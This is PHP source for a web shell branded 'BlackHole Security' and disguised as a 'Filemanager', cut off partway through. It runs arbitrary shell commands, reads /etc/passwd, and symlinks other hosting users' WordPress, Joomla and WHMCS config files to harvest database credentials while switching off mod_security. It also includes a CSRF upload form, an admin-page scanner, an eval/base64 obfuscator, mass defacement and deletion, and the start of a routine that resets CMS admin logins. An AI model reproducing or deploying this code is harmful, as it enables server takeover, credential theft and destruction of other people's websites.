            <h2>BlackHole Security</h2>
            <br>
            <h2>SIGN IN</h2>
            <form method="post">
            <input class="form-control logout" type="text" name="username" placeholder="USERNAME">
            <input class="form-control logout" type="password" name="password" placeholder="PASSWORD">
            <input class="btn btn-success logout" type="submit" name="" value="LOGIN">
            </form>
            <span class="logout">Copyright &copy; <?php print @date("Y") ?> - BlackHole Security - L0LZ666H05T - Cvar1984 - Dtlily - Mr.KaitoX</span>
            </center>
     
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($password) || ( isset($_POST['password']) && (md5($_POST['password']) == $password) ) && (empty($username) || (isset($_POST['username']) && ($_POST['username']) == $username) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
?>



<!DOCTYPE html>
<html>
<head>
<link rel="icon" href="http://cdn.onlinewebfonts.com/svg/img_77735.png" sizes="32x32" >
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<title>Filemanager</title>
</head>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css?family=Orbitron|Roboto');
	body {
		font-family: 'Roboto', sans-serif;
	} @font-face {
        font-family: Hacked;
        src: url(https://hackedfont.com/HACKED.ttf);
    } div.manager {
		width:70%;
	} td.edit {
		border:none;
		background:none;
	} textarea.edit {
		height:400px;
		resize:none;
	} th {
		text-align:center;
	} .icon {
		width:25px;
		height:25px;
	} a:hover {
		text-decoration:none;
	} div.permission {
		float:right;
	}
</style>
<body>
<script type="text/javascript">
function select_all(pilih){
	var cek = document.getElementsByName('fl[]');
	for (var i =0; n=cek.length;i++) {
		cek[i].checked = pilih.checked;
	}
}
</script>
<br>
<?php
error_reporting(0);
define('SEP', '/');
define('CURR_PATH',(empty($_GET['u'])) ? @cwd() : $_GET['u']);
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
function cwd() {
	$cwd = @str_replace('\\', '/', @getcwd());
	return $cwd;
}
function pwd() {
	$dir = @explode('/', @cwd());
	foreach ($dir as $key => $pwd) {
		print("<a href='?dir=");
		for ($i=0; $i <= $key ; $i++) { 
			print($dir[$i]);
			if ($i != $key) {
				print("/");
			}
		} print("'> ".$pwd."  </a> / ");
	}
}
function windisk() {
	$letters = "";
	$v = @explode("\\", @cwd());
	$v = $v[0];
	foreach(range("A", "Z") as $letter) {
		$bool = $isdiskette = in_array($letter, array("A"));
		if(!$bool) $bool = is_dir("$letter:\\");
		if($bool) {
			$letters .= "( <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
			if($letter.":" != $v) {
				$letters .= $letter;
			} else {
				$letters .= color(1, 2, $letter);
			} $letters .= "</a> )";
		}
	} if(!empty($letters)) {
		print "Detected Drives :  $letters <br>";
	} if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
			$v = @realpath(@cwd(). "..");
			if(empty($v)) {
				$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
			} print "<a href='".$item[1]."'>".$item[0]."</a>";
		} 
	}
}
function perms($filename) {
	$perms = fileperms($filename);
switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function permission($filename, $perms) {
	if (@is_writable($filename)) {
		?> <font color="green"><?php print $perms ?></font> <?php
	} else {
		?> <font color="red"><?php print $perms ?></font> <?php
	}
}
function Cmd($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function redirect($kemana, $apa = 'html') {
	if($apa == 'html'){
		echo "<meta http-equiv='refresh' content='0;url={$kemana}'>";
	} elseif($apa == 'js') {
		echo "<script>window.location.href='{$kemana}';</script>";
	} elseif($apa == 'php') {
		@ob_start();
		header('location:'.$kemana);
		flush();
	}
}
function size($filename) {
	$size = @filesize($filename)/1024;
	$size = @round($size, 3);
	if ($size > 1024) {
		$size = @round($size/1024,2). 'MB';
	} else {
		$size = $size. 'KB';
	} return $size;
}
function edit($filename, $text) {
	$fp = @fopen($filename, 'w');
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
        This File <b><u><?php print $filename ?></u></b> Has Been Edited
        </div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
         This File <b><u><?php print $filename ?></u></b> Failed To Edited
        </div>
		<?php
	}
}
function renames($filename, $newname) {
	if (@rename($filename, $newname)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Rename to 
			<b><u><?php print $newname ?></u></b>
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Rename
		</div>
		<?php
	}
}
function chmods($filename, $mode) {
	if (@chmod($filename, $mode)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Change to 
			<b><u><?php print $mode ?></u></b>
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Change
		</div>
		<?php
	}
}
function getMime($file) {
      if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimetype = finfo_file($finfo, $file);
        finfo_close($finfo);
      }
      else {
        $mimetype = mime_content_type($file);
      }
      if (empty($mimetype)) $mimetype = 'application/octet-stream';
      return $mimetype;
}
function createTools($filename, $location) {
	if ($_GET['create'] == $filename) {
		$directory = "".$filename.".php";
		if (file_exists($directory)) {
			?> <script>window.location='<?php print $directory ?>';</script> <?php
		} else {
			@mkdir(".tools", 0777);
			@file_put_contents($directory, @file_get_contents($location));
			?> <script>window.location='<?php print $directory ?>';</script> <?php
		}
	}
}
function makedir($filename) {
	if (@mkdir(@htmlspecialchars($filename))) {
		?>
		<div class="alert alert-success" role="alert">
			This Dir <b><u><?php print $filename ?></u></b> Has Been Created !
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This Dir <b><u><?php print $filename ?></u></b> Failed to Create
		</div>
		<?php
	}
}
function makefile($filename, $text) {
	$fp = @fopen($filename, "w");
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Created !
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Create
		</div>
		<?php
	}
	@flush();
}
if(isset($_POST['sac'])){
	if($_POST['action'] == 'delete'){
		@delete($_POST['file']);
	}
	@redirect('?dir='.@cwd().'');
}
?>
<center>
	<div class="form-control manager" disable>
		<center><b><h2>FILEMANAGER</h2></b></center>
		<table width="100%" align="center" class="table table-bordered">
			<tr>
    		<th colspan="4">
    			<center>
    				Cwd : <?php print @pwd() ?> ( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
    			</center>
    		</th>
    		<th rowspan="2">
    			<div class="btn-group" style="margin-top:22px;">
                  <a href="http://<?php print $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'] ?>" style="font-weight:bold;color:#fff;" class="btn btn-success btn-sm" style="width:100%;">
                    HOME
                  </a>
                  <button type="button" class="btn btn-sm btn-success dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                   <span class="sr-only">Toggle Dropdown</span>
                  </button>
                  <div class="dropdown-menu">
                   <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=upload">
                   	<img src="https://www.pngarts.com/files/2/Upload-PNG-Image-Background.png" class="icon">
                    Upload File</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=cmd">
                    <img src="https://img.icons8.com/metro/420/command-line.png" class="icon">
                    Command
                    </a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=makefile">
                    <img src="http://www.sclance.com/pngs/add-png/add_png_16398.jpg" class="icon">
                    Add File</a> 
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=config">
                    <img src="https://secure.webtoolhub.com/static/resources/icons/set110/3d5197b6.png" class="icon">
                     Config</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=csrf"> 
                    <img src="https://img.icons8.com/metro/420/link.png" class="icon">
                     CSRF</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=adfin"> 
                    <img src="http://icons.iconarchive.com/icons/icons8/windows-8/256/Users-Find-User-icon.png" class="icon">
                    Admin Finder</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=encode"> 
                    <img src="https://image.flaticon.com/icons/png/512/59/59118.png" class="icon">
                    Encode & Decode</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=mass"> 
                    <img src="https://www.freeiconspng.com/uploads/blank-duplicate-files-icon-png-0.png" class="icon">
                    Mass Deface & Mass Delete</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=editUser">
                    <img src="https://image.flaticon.com/icons/png/512/97/97843.png" class="icon">
                    Auto Edit User</a>
                    <a class="dropdown-item" href="?logout">
                    <img src="https://png.pngtree.com/svg/20170825/de691f7b9e.png" class="icon">
                    Logout</a>
                  </div>
                </div>
    		</th>
    	    </tr>
    	    <tr>
    	    	<th colspan="4">
    	    		<?php print @windisk() ?>
    	    	</th>
    	    </tr>
		<tr>
		<?php
	function delete($dir) {
	if (@is_dir($dir)) {
		$scandir = @scandir($dir);
		foreach ($scandir as $object) {
			if ($object != '.' && $object != '..') {
				if (@is_dir($dir.DIRECTORY_SEPARATOR.$object)) {
					@delete($dir.DIRECTORY_SEPARATOR.$object);
				} else {
					@unlink($dir.DIRECTORY_SEPARATOR.$object);
				}
			}
		} if (@rmdir($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Failed to Delete
            </div>
            </center>
		    <?php
		}
	} else {
		if (@unlink($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This File <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This File <b><u><?php print $dir ?></u></b> Failed to Delete
            </div>
            </center>
		    <?php
		}
	}
}
if ($_POST['do'] == 'delete') {
	@delete($_POST['file']);
    }
if ($_GET['do'] == 'config') {
	?>
	<tr>
			<th colspan="5">
				<h2>GET CONFIG</h2>
			</th>
		</tr>
	<?php
	if (isset($_POST['submit'])) {
		@mkdir(".config", 0777);
		$htaccess = " # Config Symlink By Mr.KaitoX \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
		$fp = fopen('.config/.htaccess','w');
		@fwrite($fp,$htaccess);
		?> 
		<tr>
			<td colspan="5">
				<a style="width:100%;" class="btn btn-success" href=".config" target="_blank">Click Here</a>
			</td>
		</tr>
		<?php
		$usr = @explode("\n",$_POST['user']);
		foreach($usr as $uss) {
			$us = @trim($uss);
			$l = ".config/";
			symlink('/home/'.$us.'/public_html/wp-config.php',$l.$us.'.wp-config');
			symlink('/home/'.$us.'/public_html/configuration.php',$l.$us.'.joomla-or-whmcs');
			symlink('/home/'.$us.'/public_html/blog/wp-config.php',$l.$us.'.wp-config');
			symlink('/home/'.$us.'/public_html/blog/configuration.php',$l.$us.'.joomla');
			symlink('/home/'.$us.'/public_html/wp/wp-config.php',$l.$us.'.wp-config');
            symlink('/home/'.$us.'/public_html/wordpress/wp-congig.php',$l.$us.'.wordpress');
            symlink('/home/'.$us.'/public_html/config.php',$l.$us.'..config');
            symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'.whmcs');
            symlink('/home/'.$us.'/public_html/support/configuration.php',$l.$us.'.supporwhmcs');
            symlink('/home/'.$us.'/public_html/secure/configuration.php',$l.$us.'.securewhmcs');
            symlink('/home/'.$us.'/public_html/clients/configuration.php',$l.$us.'.whmcs-clients');
            symlink('/home/'.$us.'/public_html/client/configuration.php',$l.$us.'.whmcs-client');
            symlink('/home/'.$us.'/public_html/billing/configuration.php',$l.$us.'.whmcs-billing');
            symlink('/home/'.$us.'/public_html/admin/config.php',$l.$us.'.admin-config');
		}
	}
	?>
	    <form method="post">
	    <tr>
	    	<td colspan="5">
	    		<textarea name="user" class="form-control edit"><?php
			       $users = @file("/etc/passwd");
			       foreach($users as $user) {
				       $str = @explode(":",$user);
                       print($str[0]."\n");
			       }
			           ?>
		           </textarea>
	    	</td>
	    </tr>
		<tr>
			<td colspan="5">
				<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
			</td>
		</tr>
	    </form>
		<?php
		die();
}
	if ($_GET['do'] == 'csrf') {
		?>
		<tr>
			<th colspan="5">
				<h2>CSRF Online</h2>
			</th>
		</tr>
		<form method="post">
		<tr>
			<td colspan="5">
				<input class="form-control" type="text" name="url" placeholder="URL : http://www.target.com/[path]/upload.php">
			</td>
		</tr>
		<tr>
			<td colspan="5">
				<input class="form-control" type="text" name="file" placeholder="POST File : Filedata / files[] / qqfile / userfile / dll">
			</td>
		</tr>
		<tr>
			<td colspan="5">
				<input class="btn btn-success" type="submit" name="lock" value="LOCK" style="width:100%;">
			</td>
		</tr>
	    </form>
		<?php
		$url = $_POST['url'];
		$file = $_POST['file'];
		$lock = $_POST['lock'];
		if ($lock) {
			?>
			<form method="post" enctype="multipart/form-data" action="<?php print $url ?>">
				<tr>
					<td colspan="4">
						<input type="file" name="<?php print $file ?>">
					</td>
					<td>
						<input class="btn btn-success btn-sm" type="submit" name="" style="width:100%;">
					</td>
				</tr>
			</form>
			<?php
			exit();
		}
	}
    if($_GET['do'] == 'adfin') {
    ?>
    <tr>
    	<th colspan="5">
    		<h2>ADMIN PAGE FINDER</h2>
    	</th>
    </tr>
    <form method="post" action="<?php $PHP_SELF ?>">
    <tr>
        <td colspan="5">
            <input class="form-control" type="text" name="url" placeholder="http://www.site.com">
        </td>
    </tr>
    <tr>
        <td colspan="5"> 
            <input style="width:100%" class="btn btn-success" type="submit" name="submit" value="FIND">
        </td>
    </tr>
</form>
<?php
    if($strip_tags) {function xss_protect($data, $strip_tags = false, $allowed_tags = "") { 

  $data = strip_tags($data, $allowed_tags . "<b>");
    }

    if(stripos($data, "script") !== false) { 
  $result = str_replace("script","scr<b></b>ipt", htmlentities($data, ENT_QUOTES)); 
    } else { 
  $result = htmlentities($data, ENT_QUOTES); 
    } 

    return $result;
}
function urlExist($url){
    $handle   = curl_init($url);
    if (false === $handle)
    {
    return false;
    }
    curl_setopt($handle, CURLOPT_HEADER, false);
    curl_setopt($handle, CURLOPT_FAILONERROR, true);
    curl_setopt($handle, CURLOPT_HTTPHEADER, Array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15") ); // request as if Firefox
    curl_setopt($handle, CURLOPT_NOBODY, true);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, false);
    $connectable = curl_exec($handle);
    curl_close($handle);
    return $connectable;
}
    if(isset($_POST['submit']) && isset($_POST['url']))
    {
  $url= htmlentities(xss_protect($_POST['url']));
  if(filter_var($url, FILTER_VALIDATE_URL))
  {
$trying = array('admin/',
        'administrator/index.php',
        'admin1/index.php',
        'admin2/index.php',
        'kpu-kun194n/login.php',
        'kpu-kun194n/index.php',
        'kpu-Kun194n/login.php',
        'Kpu-kun194n/login.php',
        'b4w45lu-kun1n94n/login.php',
        'b4w45lu-kun1n94n/index.php',
        'bawaslu-kun1n94n/login.php',
        '4dm1n-b4w45lu/index.php',
        'admin_bawaslu/index.php',
        'admin_bawaslu/login.php',
        'admin_panel/index.php',
        'bawaslu-kun1n94n/login.php',
        'adminweb/login.php',
        'admin3/index.php/',
        'admin4/index.php',
        'admin5/index.php',
        'usuarios/index.php',
        'usuario/index.php',
        'administrator/index.php',
        'moderator/index.php',
        'webadmin/index.php',
        'adminarea/index.php',
        'cms/index.php',
        'adminarea/index.php',
        'kantor/admin_login.php',
        'kantor/admin_login.php',
        'adminweb/login.php',
        'bb-admin/index.php',
        'zoom-admin/index.php',
        'admin-portal/index.php',
        'CmsPanel/index.php',
        'cmspanel/index.php',
        'indexadmin/index.php',
        'administratorbawaslu/index.php',
        'adminLogin/index.php',
        'admin_area/',
        'panel-administracion/',
        'instadmin/',
        'memberadmin/',
        'administratorlogin/',
        'adm/',
        'admin/account.php',
        'admin/index.php',
        'admin/login.php',
        'admin/admin.php',
        'admin/account.php',
        'admin_area/admin.php',
        'admin_area/login.php',
        'siteadmin/login.php',
        'siteadmin/index.php',
        'siteadmin/login.html',
        'admin/account.html',
        'admin/index.html',
        'admin/login.html',
        'admin/admin.html',
        'admin_area/index.php',
        'bb-admin/index.php',
        'bb-admin/login.php',
        'bb-admin/admin.php',
        'admin/home.php',
        'admin_area/login.html',
        'admin_area/index.html',
        'admin/controlpanel.php',
        'admin.php',
        'admincp/index.asp',
        'admincp/login.asp'
       ,'admincp/index.html'
       ,'admin/account.html'
       ,'adminpanel.html','webadmin.html',
       'webadmin/index.html');
    foreach($trying as $sec) {
    $urll = $url.'/'.$sec;
    if(urlExist($urll)) {
        ?>
        <tr>
           <td>
               <a href="<?php print $urll ?>" target="_blank"><?php print $urll ?></a>
           </td>
           <td>
               <center><span class="found">FOUND</span></center>
           </td> 
        </tr>
        <?php
    exit;
    }
    else {
    ?>
    <tr>
        <td>
            <?php print $urll ?>
        </td>
        <td>
            <center>
                <center><span class="not_found">NOT FOUND</span></center>
            </center>
        </td>
    </tr>
    <?php
    }   
    }
    echo '<p align="center"><font color="c0c0c0" size="5">Could not find admin page.</font></p>';
  }
  else
  {
    echo '<p align="center"><font color="c0c0c0" size="5">Invalid URL entered.</font></p>';    
  }
    }
?>
<?php
die();
}
if ($_GET['do'] == 'encode') {
    ?>
    <tr>
    	<th colspan="5">
    		<h2>ENCODE & DECODE</h2>
    	</th>
    </tr>
       <form method="post">
        <tr>
            <td colspan="5">
                <textarea class="form-control edit" name="code"></textarea>
            </td>
        </tr>
        <tr>
            <td colspan="3">
        <select class="form-control" name="ope">
        <option value="urlencode">url</option>
        <option value="base64">Base64</option>
        <option value="ur">base64 - convert_uu</option>
        <option value="gzinflates">gzinflate - base64</option>
        <option value="str2">str_rot13 - base64</option>
        <option value="gzinflate">str_rot13 - gzinflate - base64</option>
        <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
        <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
        </select>
            </td>
            <td>
                <input style="width:100%;" class="btn btn-success" type='submit' name='submit' value='Encode'>
            </td>
            <td>
                <input style="width:100%;" class="btn btn-success" type='submit' name='submits' value='Decode'>
            </td>
        </tr>
</form>
<?php 
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$text = $_POST['code'];
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {
case 'base64': $codi=base64_encode($text);
$codi="<?php eval('?>'.base64_decode('$codi'));";
break;
case 'str' : $codi=base64_encode(str_rot13(gzdeflate(str_rot13($text))));
$codi="<?php
eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
break;
case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
$codi="<?php
eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
break;
case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
$codi="<?php
eval('?>'.gzinflate(base64_decode('$codi')));";
break;
case 'str2' : $codi=base64_encode(str_rot13($text));
$codi="<?php
eval('?>'.str_rot13(base64_decode('$codi')));";
break;
case 'urlencode' : $codi=rawurlencode($text);
$codi="<?php eval('?>'.rawurldecode('$codi'));";
break;
case 'ur' : $codi=base64_encode(convert_uuencode($text));
$codi="<?php
eval('?>'.convert_uudecode(base64_decode('$codi')));";
break;
case 'url' :
$codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
$codi="<?php
eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
break;
default:break;
}
}
$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' :
$codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=base64_encode(convert_uudecode($text));
break;case 'url' :
$codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
?>
<tr>
    <td colspan="5">
        <textarea class="form-control edit" readonly><?php print $codi ?></textarea>
    </td>
</tr>
<?php
die();
}
if ($_GET['do'] == 'mass') {
function massdeface($cwd, $file, $filename, $type = null) {
	$scandir = scandir($cwd);
	foreach($scandir as $dir) {
		$path     = $cwd.SEP.$dir;
		$location = $path.SEP.$filename;
		if($dir === "." || $dir === "..") {
			@file_put_contents($location, $file);
		} else {
		if(is_dir($path) AND is_writable($path)) {
			?>
			<tr>
				<td colspan="5">
					<div class="alert alert-success" role="alert">
			        <b>[ DONE ]</b> => <u><?php print $location ?></u> ! 
		            </div>
				</td>
			</tr>
			<?php
			file_put_contents($location, $file);
			if($type === "-alldir") {
				massdeface($path, $file, $filename, "-alldir");
			}
			}
		}
	}
}
function massdelete($cwd, $filename) {
	$scandir = scandir($cwd);
	foreach($scandir as $dir) {
		$path     = $cwd.SEP.$dir;
		$location = $path.SEP.$filename;
		if($dir_ === '.') {
			if(file_exists($dir.SEP.$filename)) {
				@unlink($dir.SEP.$filename);
			}
		} elseif($dir_ === '..') {
			if(file_exists(dirname($dir).SEP.$filename)) {
				@unlink(dirname($dir).SEP.$filename);
			}
		} else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($location)) {
					?>
			        <tr>
			        	<td colspan="5">
			        		<div class="alert alert-success" role="alert">
			                <b>[ DELETED ]</b> => <u><?php print $location ?></u> ! 
		                    </div>
			        	</td>
			        </tr>
			        <?php
					@unlink($location);
                    @massdelete($path, $filename);
				}
			}
		}
	}
}
if (isset($_POST['submit'])) {
	if ($_POST['mass_type'] == 'single') {
		@massdeface($_POST['cwd'], $_POST['text'], $_POST['filename']);
	} elseif ($_POST['mass_type'] == 'alldir') {
		@massdeface($_POST['cwd'], $_POST['text'], $_POST['filename'], "-alldir");
	} elseif ($_POST['mass_type'] == 'massdelete') {
		@massdelete($_POST['cwd'], $_POST['filename']);
	}
}
?>
<tr>
	<th colspan="5">
		<h2>MASS TOOLS</h2>
	</th>
</tr>
<form method="post">
	<tr>
		<td colspan="5">
			<select class="form-control" name="mass_type">
		       <option value="single">Single Dir</option>
		       <option value="alldir">All Dir</option>
		       <option value="massdelete">Delete Dir</option>
	        </select>
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<input class="form-control" type="text" name="cwd" value="<?php print @cwd() ?>">
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<input class="form-control" type="text" name="filename" value="index.php">
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<textarea class="form-control edit" name="text">HACKED BY Mr.KaitoX</textarea>
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
		</td>
	</tr>
</form>
<?php
die();
}
			if ($_POST['do'] == 'edit') {
	          if (isset($_POST['submit'])) {
		        @edit($_POST['file'], $_POST['text']);
	        } $text = @htmlspecialchars(@file_get_contents($_POST['file']));
	        ?>
	        <form method="post">
	        	<tr>
	        		<td colspan="5">
	        			<div class="alert alert-primary" role="alert">
            				Rename Filename : <b><?php print $_POST['file'] ?></b> | 
            				Size : <b><?php print @size($_POST['file']) ?></b> | 
            				Permission : <b><?php print @permission($_POST['file'], @perms($_POST['file'])) ?></b> | 
            				Type : <b><?php print @getMime($_POST['file']) ?></b>
            			</div>
	        		</td>
	        	</tr>
	        	<td colspan="5" class="edit">
	        	<textarea class="form-control edit" name="text"><?php print $text ?></textarea></td>
	        	<input type="hidden" name="do" value="edit">
	        	<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
		        <tr><td colspan="5" class="edit">
		        <center>
		        	<input style="width:100%;" type="submit" name="submit" class="btn btn-success">
		        </center></td>
	        </form>
	        <?php
            }
            if ($_POST['do'] == 'renames') {
            	if (isset($_POST['submit'])) {
            		@renames($_POST['file'], $_POST['newname']);
            	}
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            			<div class="alert alert-primary" role="alert">
            				Rename Filename : <b><?php print $_POST['file'] ?></b> | 
            				Size : <b><?php print @size($_POST['file']) ?></b> | 
            				Permission : <b><?php print @permission($_POST['file'], @perms($_POST['file'])) ?></b> | 
            				Type : <b><?php print @getMime($_POST['file']) ?></b>
            			</div>
            		</td>
            		</tr>
            		<td colspan="4">
            			<input class="form-control" style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
            		</td>
            		<input type="hidden" name="do" value="renames">
	        	    <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
            		<td>
            			<input style="width:100%;" type="submit" name="submit" class="btn btn-success"> 
            		</td>
            	</form>
            	<?php
            }
            if ($_GET['do'] == 'cmd') {
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="4">
            				<input class="form-control" type="text" name="cmd">
            			</td>
            			<td>
            				<input type="submit" name="submit" class="btn btn-success" style="width:100%;">
            			</td>
            		</tr>
            	</form>
            	<?php
            	if (isset($_POST['submit'])) {
            		?>
            		<tr>
            			<td colspan="5">
            				<textarea class="form-control edit" readonly><?php print @cmd($_POST['cmd']) ?></textarea>
            			</td>
            		</tr>
            		<?php
            		die();
            	}
            }
            if ($_GET['do'] == 'editUser') {
            	if($_POST['hajar']) {
		   if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
